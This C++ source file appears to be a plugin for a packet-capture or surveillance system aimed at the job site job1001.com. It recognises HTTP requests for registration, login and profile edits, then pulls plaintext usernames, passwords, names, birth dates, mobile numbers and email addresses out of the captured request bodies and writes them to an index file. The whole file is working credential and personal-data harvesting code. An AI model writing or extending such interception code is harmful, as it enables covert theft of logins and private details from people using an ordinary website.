#include "StdAfx.h"
#include "EmployYiLanYingCai.h"

employ::YiLanYingCai::YiLanYingCai(HttpSession *http_session, const string &pro_name) : Employ(http_session,pro_name)
{
	app_ = "一览英才网";
}

employ::YiLanYingCai::~YiLanYingCai()
{
	
}

int employ::YiLanYingCai::IsYiLanYingCai(HttpSession *http_session)
{
	//注册(邮箱注册)
	if((http_session->m_Requestline.m_Host.Find("www.job1001.com")!=-1) && 
		(http_session->m_Requestline.m_URI.Find("/personServe/2015/regdeal.php")!=-1)&&	
		(http_session->m_Requestline.m_URI.Find("/personServe/2015/regdeal.php?detail") ==-1))
	{
		return kPcWebRegisterEmail;
	}
	//登录
	if((http_session->m_Requestline.m_Host.Find("www.job1001.com")!=-1) && 
		(http_session->m_Requestline.m_URI.Find("/personServe/CheckUserAjax.php")!=-1) )
	{
		return kPcWebLogin;
	}
	//修改个人信息
	if((http_session->m_Requestline.m_Host.Find("www.job1001.com")!=-1) && 
		(http_session->m_Requestline.m_URI.Find("/myNew/home.php?mode=resume&doaction=resumeSave&detail=basic")!=-1) )
	{
		return kPcWebModiy;
	}
	return 0;
}

int employ::YiLanYingCai::Process(const char *packet,int action)
{
	//注册(邮箱注册)
	if (action == kPcWebRegisterEmail)
	{
		return PcWebRegisterEmail(packet);
	}
	//登录
	if (action == kPcWebLogin)
	{
		return PcWebLogin(packet);
	}
	//修改基本信息
	if (action == kPcWebModiy)
	{
		return PcWebModiy(packet);
	}
	return 1;
}

//注册(邮箱注册)
int employ::YiLanYingCai::PcWebRegisterEmail(const char *packet)
{
	string src_data(packet);
	src_data = ms_->UTF8ToGBK(UrlDecode(src_data));
	if (src_data.rfind("\r\n") != -1)
	{
		src_data = src_data.substr(src_data.rfind("\r\n"));
	}
	ms_->SplitStringToMap(src_data,'&','=');
	string regtype = ms_->GetValueFromMapByKey("regtype");
	string p_uname = ms_->GetValueFromMapByKey("p_uname",true);
	string iname = ms_->GetValueFromMapByKey("iname",true);
	string password = ms_->GetValueFromMapByKey("password",true);
	output_text_ =
		"user="  + p_uname + "\r\n" + 		//账号	
		"servername=" + iname + "\r\n" + 	//姓名	        
		"pass=" + 	password + "\r\n"		//密码
		"netmark=" + app_ + "\r\n" + 		//来源
		"state=注册\r\n";
	WriteIndexFile();
 	return 1;
}

//登录
int employ::YiLanYingCai::PcWebLogin(const char *packet)
{
	string src_data(packet);
	src_data = src_data.substr(src_data.rfind("\r\n")+strlen("\r\n"));
	src_data = ms_->UTF8ToGBK(UrlDecode(src_data));
	ms_->SplitStringToMap(src_data,'&','=');
	//账号
    string UserName = ms_->GetValueFromMapByKey("uname",true);
	//密码
	string Password = ms_->GetValueFromMapByKey("password",true);
	if (UserName.empty() || Password.empty())
	{
		return 0;
	}
	output_text_ =
		"user="  + UserName + "\r\n" + 	//账号		
		"pass=" + Password + "\r\n" + 	//密码
		"netmark=" + app_ + "\r\n" + 	//来源
		"state=登录\r\n";
	WriteIndexFile();
	return 1;
}

//修改基本信息
int employ::YiLanYingCai::PcWebModiy(const char *packet)
{
	string src_data(packet);
	src_data = ms_->UTF8ToGBK(UrlDecode(src_data));
	ms_->SplitStringToMap(src_data,'&','=');
	string username  = ms_->GetValueFromMapByKey("iname",true);
	string sex = ms_->GetValueBetweenBeginEnd(src_data,"sex=","&");
	string birth = ms_->GetValueFromMapByKey("bday",true);
	string mobile = ms_->GetValueFromMapByKey("shouji",true);
	string email = ms_->GetValueFromMapByKey("email",true);
	if (username.empty() || birth.empty() || mobile.empty() || email.empty())
	{
		return 0;
	}
	output_text_=
		"servername=" + username + "\r\n" + //姓名	      
		"sex=" + sex + "\r\n" + 	//性别	
		"msg=" + birth + "\r\n" + 	//出生日期	
		"oid=" + mobile + "\r\n" + 	//手机号		
		"mid=" + email + "\r\n" + 	//邮箱
		"netmark=" + app_ + "\r\n" + //来源
		"state=修改基本信息\r\n";
	WriteIndexFile();
	return 1;
}